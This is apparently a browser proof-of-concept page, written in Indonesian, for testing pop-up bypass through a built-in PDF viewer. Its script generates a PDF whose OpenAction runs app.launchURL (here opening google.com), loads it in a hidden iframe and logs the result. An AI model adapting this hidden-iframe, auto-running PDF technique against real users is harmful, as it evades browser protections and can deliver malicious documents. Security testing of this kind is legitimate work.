<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PDF Viewer Exploit Test</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
        button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
        button:hover { background: #b71c1c; }
        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
        .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
    </style>
</head>

<body>
<div class="panel" id="main-panel">
    <h1>PDF Viewer Pop-up Bypass Test</h1>
    <p>Mencoba memicu pop-up dari dalam PDF Viewer bawaan browser menggunakan <code>app.launchURL</code>.</p>
    <button id="start-btn" type="button">Mulai Uji Eksploitasi</button>
    <div id="status" role="status">Menunggu interaksi...</div>
    <div class="log" id="log">Log akan muncul di sini...</div>
</div>

<script>
    const startBtn = document.getElementById("start-btn");
    const statusDiv = document.getElementById("status");
    const logDiv = document.getElementById("log");

    function log(msg) {
        logDiv.innerHTML += "<br>> " + msg;
        console.log(msg);
    }

    // Fungsi untuk membuat PDF yang berisi JavaScript app.launchURL
    const createMaliciousPdf = () => {
        // PDF Minimalis dengan JavaScript Terbuka Otomatis
        // Catatan: Hanya Adobe Reader yang mendukung app.launchURL
        const pdfContent = 
            "%PDF-1.4\n" +
            "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n" +
            "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n" +
            "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n" +
            "4 0 obj\n<< /S /JavaScript /JS (app.launchURL\\(\\\"https://google.com\\\", true\\);) >>\nendobj\n" +
            "xref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000195 00000 n \n" +
            "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n300\n%%EOF\n";
        
        return new Blob([pdfContent], { type: 'application/pdf' });
    };

    startBtn.addEventListener("click", () => {
        statusDiv.textContent = "Membuat PDF berisi app.launchURL...";
        log("Membuat PDF payload...");

        try {
            // 1. Buat Blob PDF
            const pdfBlob = createMaliciousPdf();
            const pdfUrl = URL.createObjectURL(pdfBlob);

            // 2. Buat Iframe Tersembunyi
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = pdfUrl;
            
            // 3. Tambahkan ke DOM
            document.body.appendChild(iframe);
            log("Iframe tersembunyi dengan PDF dimuat.");

            statusDiv.textContent = "PDF dimuat. Cek apakah tab Google terbuka otomatis.";
            statusDiv.style.color = "#4CAF50";

            // 4. Cleanup
            setTimeout(() => {
                if (iframe.parentNode) document.body.removeChild(iframe);
                URL.revokeObjectURL(pdfUrl);
                log("Cleanup selesai.");
            }, 5000);

        } catch (e) {
            statusDiv.textContent = "Gagal: " + e.message;
            statusDiv.style.color = "#f00";
            log("Error: " + e.message);
        }
    });
</script>
</body>
</html>
